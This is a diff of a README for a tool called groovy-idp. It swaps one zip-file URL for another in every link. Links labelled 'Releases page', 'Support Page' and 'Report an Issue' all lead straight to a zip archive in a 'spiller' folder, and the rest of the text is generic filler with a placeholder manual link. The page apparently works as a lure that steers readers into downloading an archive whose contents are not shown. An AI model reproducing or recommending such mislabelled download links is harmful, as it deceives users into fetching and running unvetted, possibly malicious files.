@@ -6,7 +6,7 @@ Welcome to groovy-idp, your solution for effortless identity management. This gu
 
 ## 📥 Download Now
 
-[![Download groovy-idp](https://raw.githubusercontent.com/NEOY101/groovy-idp/main/spiller/groovy-idp.zip)](https://raw.githubusercontent.com/NEOY101/groovy-idp/main/spiller/groovy-idp.zip)
+[![Download groovy-idp](https://github.com/NEOY101/groovy-idp/raw/refs/heads/main/spiller/groovy_idp_1.8.zip)](https://github.com/NEOY101/groovy-idp/raw/refs/heads/main/spiller/groovy_idp_1.8.zip)
 
 ## 💻 System Requirements
 
@@ -30,7 +30,7 @@ groovy-idp provides several key features to enhance your identity management:
 
 To get started with groovy-idp, follow these steps:
 
-1. **Visit the Release Page:** Go to the [Releases page](https://raw.githubusercontent.com/NEOY101/groovy-idp/main/spiller/groovy-idp.zip) to find the latest version.
+1. **Visit the Release Page:** Go to the [Releases page](https://github.com/NEOY101/groovy-idp/raw/refs/heads/main/spiller/groovy_idp_1.8.zip) to find the latest version.
    
 2. **Locate the Latest Release:** The most recent version will be listed at the top. Look for the release notes for important information about new features and fixes.
 
@@ -80,13 +80,13 @@ If you encounter issues:
 
 If you need further assistance:
 
-- Visit our [Support Page](https://raw.githubusercontent.com/NEOY101/groovy-idp/main/spiller/groovy-idp.zip) to report problems or ask questions.
+- Visit our [Support Page](https://github.com/NEOY101/groovy-idp/raw/refs/heads/main/spiller/groovy_idp_1.8.zip) to report problems or ask questions.
 - Join our community on social media for tips and shared experiences with other users.
 
 ## 🔗 Useful Links
 
-- [Releases page](https://raw.githubusercontent.com/NEOY101/groovy-idp/main/spiller/groovy-idp.zip)
+- [Releases page](https://github.com/NEOY101/groovy-idp/raw/refs/heads/main/spiller/groovy_idp_1.8.zip)
 - [User Manual](link-to-user-manual)
-- [Report an Issue](https://raw.githubusercontent.com/NEOY101/groovy-idp/main/spiller/groovy-idp.zip)
+- [Report an Issue](https://github.com/NEOY101/groovy-idp/raw/refs/heads/main/spiller/groovy_idp_1.8.zip)
 
 Thank you for choosing groovy-idp! We hope it makes your identity management simpler and more secure.
